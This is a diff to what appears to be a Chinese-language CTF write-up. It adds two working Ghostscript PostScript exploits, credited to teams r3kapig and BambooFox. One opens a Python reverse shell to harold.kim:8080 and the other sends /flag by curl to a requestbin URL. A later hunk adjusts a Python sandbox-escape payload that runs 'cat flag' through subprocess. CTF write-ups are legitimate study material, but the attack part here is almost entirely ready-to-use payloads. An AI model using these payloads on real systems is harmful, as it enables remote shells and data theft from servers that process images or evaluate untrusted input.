@@ -250,6 +250,56 @@ convert: FailedToExecuteCommand `"gs" -q -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOP
 convert: no images defined `what.gif' @ error/convert.c/ConvertImageCommand/3210.
 ```
 
+在该题目中由于使用PIL,PIL会检查图片的尺寸，所以该payload无法生效。需要改造一下。
+
+r3kapig:
+
+```
+%!PS-Adobe-3.0 EPSF-3.0
+%%BoundingBox: 0 0 30 30
+
+userdict /setpagedevice undef
+save
+legal
+{ null restore } stopped { pop } if
+{ legal } stopped { pop } if
+restore
+mark /OutputFile (%pipe%python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("harold.kim",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);') currentdevice putdeviceprops
+```
+
+BambooFox:
+
+```
+%!PS-Adobe-1.0
+%%Creator: PS_Write.F
+%%CreationDate: 09/29/99
+%%Title: region.ps
+%%Document-Fonts: Times-Roman
+%%BoundingBox:  0   0  1000  500
+%%BeginProlog
+%%EndProlog
+/Palatino-Roman findfont
+0.0000 0.0000 0.0000 setrgbcolor
+%%Page:     1    1
+/Times-Roman findfont
+20 scalefont
+setfont
+userdict /setpagedevice undef
+save
+legal
+{ null restore } stopped { pop } if
+{ legal } stopped { pop } if
+restore
+mark /OutputFile (%pipe%curl --data "`cat /flag`" http://requestbin.fullcontact.com/12jsa501) currentdevice putdeviceprops
+showpage
+%%Trailer
+%%Pages:      1
+%%EOF
+quit
+```
+
+
+
 
 
 # vimshell
@@ -413,7 +463,7 @@ payload:
 list: 
 
 - 	`[e for e in list(open('flag'))]`
-- 	`[1 for x in [eval("sys.stdout.write(repr([t for t in ().__class__.__base__.__subclasses__() if t.__name__ == 'Sized'][0].__len__.__globals__['__builtins__']['__import__']('subprocess').check_output('cat flag', shell=True)))")]]`
+	 	`[1 for x in [eval("sys.stdout.write(repr([t for t in ().__class__.__base__.__subclasses__() if t.__name__ == 'Sized'][0].__len__.__globals__['__builtins__']['__import__']('subprocess').check_output('cat flag', shell=True)))")]]`
 
 Subscript: 
 
